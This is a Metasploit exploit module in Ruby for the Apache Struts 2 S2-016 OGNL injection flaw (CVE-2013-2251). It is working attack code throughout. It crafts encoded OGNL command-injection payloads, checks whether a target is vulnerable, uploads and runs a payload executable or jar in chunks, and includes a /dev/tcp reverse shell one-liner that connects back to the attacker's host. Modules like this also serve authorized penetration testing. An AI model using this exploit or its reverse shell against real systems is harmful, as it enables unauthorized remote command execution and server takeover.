##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Remote Command Execution in Apache Struts 2.0.0 - 2.3.15 DefaultActionMapper (S2-016)',
			'Description'    => %q{
				Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or
				"redirectAction:" available in Struts 2 DefaultActionMapper is not properly sanitized.
				In addition with any following information will be evaluated as OGNL expression against
				the value stack resulting in command injection.

				This module demonstrates remote command execution on supported platform. Payload
				construction currently supports OGNL double evaluation syntax both %{} and ${} as
				well as three actions of DefaultActionMapper which is "redirect:", "action:" and
				"redirectAction:". Various encoding scheme in OGNL payload including UNICODE, mixing
				UNICODE and OCTAL and URL encoding are also supported. Note that mixing UNICODE and
				OCTAL encoding scheme works only with Struts below 2.3.14.3 unless there is a configuration
				of "struts.allowed.action.names" in struts.xml to allow OCTAL encoding in OGNL payload

				In additon, this module has been tested successfully on Apache Struts 2.3.15 over
				Apache Tomcat 7 on Red Hat Enterprise Linux 5 and Mac OS X Lion (10.7.5 X86_64)
				operating systems.
			},
			'Author'         =>
				[
					'Takeshi Terada', # Vulnerability discovery
					'sinn3r',       # Original metasploit module for DefaultActionMapper
					'juan vazquez', # Original metasploit module for DefaultActionMapper
					'mihi', # Original ARCH_JAVA support
					'Lersak Limwiwatkul <lersak[@]gmail.com>' # Remote command execution support
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-2251' ],
					[ 'OSVDB', '95405' ],
					[ 'BID', '61189' ],
					[ 'URL', 'http://struts.apache.org/release/2.3.x/docs/s2-016.html' ],
					[ 'URL', 'http://struts.apache.org/release/2.3.x/docs/s2-015.html' ]
				],
			'Platform' 	 => [ 'linux', 'osx', 'java' ],
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux',
						}
					],
					[ 'Mac OS X Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'osx',
						}
					],
					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						}
					]
				],
			'DisclosureDate' => 'Jul 2 2013',
			'DefaultTarget' => 2))

			register_options(
				[
					Opt::LPORT(4444),
					Opt::RPORT(8080),
					OptEnum.new('HTTPMETHOD', [ true, 'HTTP Method to use, GET or POST', 'GET', ['GET','POST']]),
					OptEnum.new('OGNL_EVAL', [ true, 'OGNL expression opening bracket, % or $', '$', ['$','%']]),
					OptEnum.new('OGNL_ENCODE', [ true, 'Encoding of OGNL expression', 'unicode', ['unicode','mixoctal','none']]),
					OptEnum.new('STRUTS_ACTION', [ true, 'Action of Struts 2 DefaultActionMapper: action, redirect and redirectAction', 'redirect', ['action','redirect','redirectAction']]),
					OptEnum.new('CHUNK_LEN', [ true, 'Chunk\'s length of uploaded payload', '100', ['40','80','100','200','400']]),
					OptString.new('TARGETURI', [ true, 'The path to a struts application action i.e. /struts2-showcase/skill/edit.action', ""]),
					OptString.new('CMD', [ false, 'Execute a specific command', "" ]),
					OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
					OptString.new("HTTP_MESSAGE", [ false, "HTTP GET or POST message", "" ]),
					OptBool.new('REVERSE_SHELL_CMD', [ false, 'Execute the pre-defined reverse bash shell command', false ])
				], self.class)
	end

	def vprint_http_message(req, res)
		# Print request
		msg = ""
		if req["method"] == 'POST'
			msg << req["method"].to_s + " " + req["uri"].to_s + "\n\n"
			msg << req["data"].to_s + "\n"
		else
			msg << req["method"].to_s + " " + req["uri"].to_s + "?" + req["query"].to_s + "\n"
		end
		vprint_debug("Request:\n" + msg)

		# Print response
		vprint_debug("Response:\n" + res.to_s[0,300])
	end

	def ognl_encode(str, opts = {})
		return str.unpack('U*').map{ |i| "\\u" + i.to_s(16).rjust(4,'0') }.join if opts == "unicode"
		return str.unpack('U*').map{ |i| "\\" + i.to_s(8).rjust(3,'0') }.join if opts == "mixoctal"
	end

	def generate_struts_payload(cmd, opts = {})
		# Initial required parameter
		proof = rand_text_alpha(8 + rand(4))
		tail = rand_text_alpha(8 + rand(4))
		rand = rand_text_alpha(8 + rand(4))
		struts_action = datastore['STRUTS_ACTION']
		ognl_eval = Rex::Text::uri_encode(datastore['OGNL_EVAL'])
		ognl_encode = datastore['OGNL_ENCODE']

		# Construct the payload
		case opts
			when 'check'
				ognl = "new java.lang.String('#{proof}')"
			when 'java'
				ognl = cmd
			when 'cmd'
				cmd.gsub!(/\s+/,'\',\'')
				cmd.gsub!('@',' ')
				ognl = "(new java.lang.ProcessBuilder(new java.lang.String[]{'#{cmd}'})).start()"
		end

		# Unicode Encoding
		if ognl_encode == "unicode"
			ognl = ognl_encode(ognl, "unicode")
		# Unicode and Octal Encoding
		elsif ognl_encode == "mixoctal"
			ognl = ognl_encode("('", "unicode") + ognl_encode(ognl, "mixoctal") + ognl_encode("')(#{rand})", "unicode")
		# URL Encoding
		else
			ognl = Rex::Text::uri_encode(ognl)
		end

		# Return generated payload
		payload = "#{struts_action}:#{ognl_eval}{#{ognl}}=#{tail}"
		return [ payload, proof ] if opts == "check"
		return payload
	end

	def check
		# Initial parameter
		http_method = datastore['HTTPMETHOD']
		http_message = Rex::Text::uri_encode(datastore['HTTP_MESSAGE'])
		payload, proof = generate_struts_payload(nil, 'check')
		uri = normalize_uri(target_uri.path)

		# Compose probe message
		query = ""
		query = http_message if http_message.length > 0

		req = {
			'uri' => uri,
			'method' => http_method
		}

		case http_method
			when 'GET'
				req.merge!({ 'query' => query })
			when 'POST'
				req.merge!({ 'data' => query })
		end

		# Send probe request
		res = send_request_cgi(req)

		# Is target reachable
		if res.nil? or res.code != 200
			print_error("Target is not accessible - #{rhost}:#{rport}#{uri}")
			return Exploit::CheckCode::Unknown
		else
			print_good("#{rhost}:#{rport}#{uri} is reachable")
		end


		# Compose check message
		if http_message.length > 0
			query = http_message + "&" + payload
		else
			query = payload
		end

		case http_method
			when 'GET'
				req.merge!({ 'query' => query })
			when 'POST'
				req.merge!({ 'data' => query })
		end

		# Send check message
		res = send_request_cgi(req)
		vprint_http_message(req, res)

		# Is target vulnerable
		if res and res.code == 302 and res.headers['Location'] =~ /#{proof}/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def execute_command(cmd, opts = {})
		# Initial parameter
		http_method = datastore['HTTPMETHOD']
		http_message = Rex::Text::uri_encode(datastore['HTTP_MESSAGE'])
		uri = normalize_uri(target_uri.path)

		req = {
			'uri' => uri,
			'method' => http_method
		}

		# Verbosely command executed
		vprint_status("Attempting to execute: #{cmd}")

		# Retrieve payload
		payload = ""
		case opts
			when 'java'
				payload << generate_struts_payload(cmd, 'java')
			else
				payload << generate_struts_payload(cmd, 'cmd')
		end

		# Compose exploit message
		if http_message.length > 0
			query = http_message + "&" + payload
		else
			query = payload
		end

		case http_method
			when 'GET'
				req.merge!({ 'query' => query })
			when 'POST'
				req.merge!({ 'data' => query })
		end

		# Send probe request
		res = send_request_cgi(req, 5)
		vprint_http_message(req, res)
	end

	def reverse_shell_cmd_stager
		# Retrieve target machine and port
		target = datastore['LHOST'].to_s
		port = datastore['LPORT'].to_s

		# Embedded one liner reverse shell with shell interpreter
		cmd = "/bin/sh -c /bin/sh@-i@&>@/dev/tcp/HOST/PORT@0>&1@2>&1"
		cmd.gsub!(/HOST/, target)
		cmd.gsub!(/PORT/, port)

		# Execute reverse bash shell command
		execute_command(cmd)
	end

	def java_upload_part(part, filename, append = 'false')
		cmd = ""
		cmd << "new java.io.FileOutputStream('#{filename}',#{append})"
		cmd << ".write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}'))"
		cmd << ".close()"
		execute_command(cmd, 'java')
	end

	def platform_specific_stager(platform = {})
		# Define payload properties
		uri = normalize_uri(target_uri.path)
		writable_dir = normalize_unix_path(datastore['WritableDir'] + "/")
		chunk_length = datastore['CHUNK_LEN'].to_i

		# Getting payload
		case platform
			when 'unix'
				@payload_exe = writable_dir + rand_text_alphanumeric(8+rand(8))
				exe = generate_payload_exe
			when 'java'
				@payload_exe = writable_dir + rand_text_alphanumeric(8+rand(8)) + ".jar"
				exe = payload.encoded_jar.pack
		end

		# Uploading the generated payload
		append = 'false'
		print_status("Uploading payload to #{datastore['WritableDir']} on target #{rhost}:#{rport}:#{uri}")
		while(exe.length > chunk_length)
			print(".")
			java_upload_part(exe[0, chunk_length], @payload_exe, append)
			exe = exe[chunk_length, exe.length - chunk_length]
			append='true'
		end
		java_upload_part(exe, @payload_exe, append)
		print("\n"); print_good("Uploading payload completed")

		# Executing payload
		print_status("Executing payload on #{target['Platform']} platform")
		case platform
			when 'unix'
				execute_command("/bin/sh -c chmod@+x@#{@payload_exe}")
				execute_command("/bin/sh -c #{@payload_exe}")
			when 'java'
				execute_command("java -jar #{@payload_exe}")
		end
	end

	def on_new_session(client)
		# Traditional payload
		if client.type != "meterpreter"
			if datastore['REVERSE_SHELL_CMD']
				print_error("Press CTRL+C to exit from this session.")
				return
			else
				print_error("Please use a meterpreter payload in order to automatically cleanup.")
				print_error("The #{@payload_exe} file may be removed manually.")
				return
			end
		end
		# Meterpreter payload
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
		print_warning("Deleting the #{@payload_exe} file")
		client.fs.file.rm(@payload_exe)
	end

	def exploit
		# Initial required variable
		uri = normalize_uri(target_uri.path)

		# Executing user's command
		if not datastore['CMD'].empty?
			print_status("Executing remote command on #{rhost}:#{rport}:#{uri}")
			execute_command(datastore['CMD'])
			return
		end

		# Executing reverse bash shell command
		if target['Platform'] != "java"
			if datastore['REVERSE_SHELL_CMD']
				print_status("Executing reverse bash shell command on #{rhost}:#{rport}:#{uri}")
				reverse_shell_cmd_stager
				return
			end
		end

		# Executing payload on specific platform
		case target['Platform']
			when 'linux'
				platform_specific_stager('unix')
			when 'osx'
				platform_specific_stager('unix')
			when 'java'
				platform_specific_stager('java')
			else
				fail_with(Exploit::Failure::NoTarget, "Unsupported target platform")
		end
		handler
	end
end

